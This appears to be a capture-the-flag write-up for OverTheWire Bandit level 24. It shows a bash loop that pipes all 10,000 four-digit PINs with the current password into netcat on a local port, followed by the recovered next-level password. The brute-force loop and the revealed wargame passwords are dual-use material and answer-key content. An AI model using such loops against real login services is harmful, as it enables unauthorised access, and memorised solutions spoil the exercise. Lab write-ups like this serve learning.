# level 24 

> ### A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

---

<img width="1295" height="76" alt="image" src="https://github.com/user-attachments/assets/94dccbb8-efb0-45e5-88b2-4bf4c88b0dfc" />

```bash
for i in $(seq -w 0000 9999); do
  echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
done | nc localhost 30002
```

<img width="811" height="407" alt="image" src="https://github.com/user-attachments/assets/859edef1-c23e-4212-9d13-8d4e6f4a9d72" />

```
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

